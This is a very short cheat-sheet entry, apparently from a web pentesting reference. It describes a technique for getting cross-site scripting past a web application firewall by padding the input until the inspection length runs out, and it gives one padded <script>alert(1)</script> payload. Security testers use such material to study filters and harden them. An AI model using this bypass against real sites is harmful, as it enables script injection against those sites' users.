# XSS WAF Bypass

### 1) XSS Truncation

The number of pad characters depends on the configured WAF rule

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>

